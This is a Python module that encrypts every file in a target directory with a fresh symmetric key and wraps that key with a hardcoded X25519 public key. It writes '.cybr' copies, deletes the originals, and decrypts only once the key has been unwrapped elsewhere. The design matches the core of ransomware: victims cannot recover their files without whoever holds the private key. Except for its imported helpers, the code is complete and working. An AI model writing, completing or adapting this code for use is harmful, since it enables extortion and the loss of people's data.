import os, base64
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives import serialization
from .config import PUBLIC_KEY_B64, EWK_PATH, REMOVE_ORIGINAL_FILES, FILE_EXTENSION, EWK_FILENAME

from .crypto_core import (
    generate_symkey,
    wrap_symkey_x25519,
    encrypt_with_symkey,
    decrypt_with_symkey,
    _zeroize_bytes,
)

raw_pub_bytes = base64.b64decode(PUBLIC_KEY_B64)
pub_key_hardcoded = x25519.X25519PublicKey.from_public_bytes(raw_pub_bytes)

def _ensure_symkey_and_return_plain_for_encrypt(pub_key: x25519.X25519PublicKey):
    """
    Situation for encrypt:
    - If 00000000.ewk does not exist: generates symkey (bytes), wraps it with pub_key, saves 00000000.ewk
    and returns the symkey (value in memory) — without requesting private key.
    - If 00000000.ewk already exists: does NOT attempt to unwrap nor request private key.
    Instead returns None and the caller decides (we abort encryption
    to force explicit user action — avoid confusion).
    """
    if not EWK_PATH.exists():
        # generates a new symkey, wraps it, and saves it
        symkey = generate_symkey()
        wrapped = wrap_symkey_x25519(symkey, pub_key)
        with EWK_PATH.open("w", encoding="utf-8") as f:
            f.write(wrapped.decode("utf-8"))
        print(f"Generated new symkey and saved to { EWK_PATH }.")
        return symkey

    # if already exists, don't automatically unwraps
    print(f"{EWK_PATH} already exists.")

    return None

def encrypt_all_in_dir(target_dir: Path, *, remove_original: bool = REMOVE_ORIGINAL_FILES) -> int:
    print() 
    processed = 0

    # try to get symkey in plaintext to use
    symkey = _ensure_symkey_and_return_plain_for_encrypt(pub_key_hardcoded)

    if symkey is None:
        return processed

    # from this point on, we have symkeys (bytes) in memory and we don't require a private key
    try:
        for entry in target_dir.iterdir():
            if not entry.is_file():
                continue
            name = entry.name
            # 1) skip dot-files
            if name.startswith("."):
                continue

            # 2) skip key file (00000000.ewk)
            if name == EWK_FILENAME:
                continue

            # 3) skip files .cybr
            if name.endswith(FILE_EXTENSION):
                continue

            # NOTE: The original code had a redundant check for FILE_EXTENSION here. Removed it.

            try:
                with entry.open("rb") as f:
                    data = f.read()

                enc = encrypt_with_symkey(symkey, data)

                out_path = entry.with_name(entry.name + FILE_EXTENSION)
                with out_path.open("wb") as f:
                    f.write(enc)

                if remove_original:
                    os.remove(entry)

                print(f"Encrypted: {entry.name} -> {out_path.name}")
                processed += 1

            except Exception as e:
                print(f"Error encrypting {entry}: {type(e).__name__} - {e}")

    finally:
        # Ensure the symmetric key is zeroized after use
        _zeroize_bytes(symkey)

    print(f"\nFinished. Encrypted files: {processed}")
    return processed

def decrypt_all_in_dir(target_dir: Path, *, remove_enc: bool = REMOVE_ORIGINAL_FILES) -> int:
    """
    - Uses ONLY the raw symkey saved in 00000000.ewk (32 bytes).
    - If it fails -> wrong key.
    """
    print() 

    SYMKEY_FILE = EWK_PATH   # file containing ONLY the pure symkey (after unwrapping by external tool)
    processed = 0
    symkey = None # Initialize symkey for the try/finally block

    # you need the pure symkey
    if not SYMKEY_FILE.exists():
        print(f"File {EWK_FILENAME} not found — impossible to decrypt.")
        return processed

    try: # Outer try/finally block starts here
        try:
            raw = SYMKEY_FILE.read_bytes()
        except Exception as e:
            print(f"Error reading {SYMKEY_FILE.name}: {e}")
            return processed
        
        # if it's base64 text, it decodes it; otherwise, it assumes pure bytes
        try:
            # it attempts to interpret the text as UTF-8 and decode it into base64
            txt = raw.decode("utf-8").strip()
            # Validates and decodes; if invalid, this will generate binascii.Error
            candidate = base64.b64decode(txt, validate=True)
            if len(candidate) == 32:
                symkey = candidate
            else:
                # decoded but strange size -> treat as invalid
                print("Invalid decoded key length. Wrong key or corrupted file.")
                return processed
        except Exception:
            # it wasn't a valid base64 code — assuming raw is already the key in bytes
            if len(raw) == 32:
                symkey = raw
            else:
                print("Invalid key length. Wrong key or corrupted file.")
                return processed

        # try to decrypt the files.
        for entry in target_dir.iterdir():
            if not entry.is_file():
                continue

            if entry.name.startswith(".") or entry.name.lower() == SYMKEY_FILE.name:
                continue

            if not entry.name.endswith(FILE_EXTENSION):
                continue

            try:
                data = entry.read_bytes()
                plaintext = decrypt_with_symkey(symkey, data)

                out_path = entry.with_name(entry.name[: -len(FILE_EXTENSION)])
                out_path.write_bytes(plaintext)

                if remove_enc:
                    entry.unlink()

                print(f"Decrypted: {entry.name} -> {out_path.name}")
                processed += 1

            except Exception:
                print(f"Failed to decrypt {entry.name}. Wrong key?")
                # Return immediately on failure to decrypt any file, preserving the key file.
                return processed 

        # delete key after success
        try:
            SYMKEY_FILE.unlink()
            print(f"{SYMKEY_FILE.name} deleted.")
        except Exception as e:
            print(f"Could not delete {SYMKEY_FILE.name}: {e}")

        print(f"Finished. Decrypted files: {processed}")
        return processed

    finally:
        # Ensure the symmetric key is zeroized, even if decryption fails or process is aborted.
        if symkey:
            _zeroize_bytes(symkey)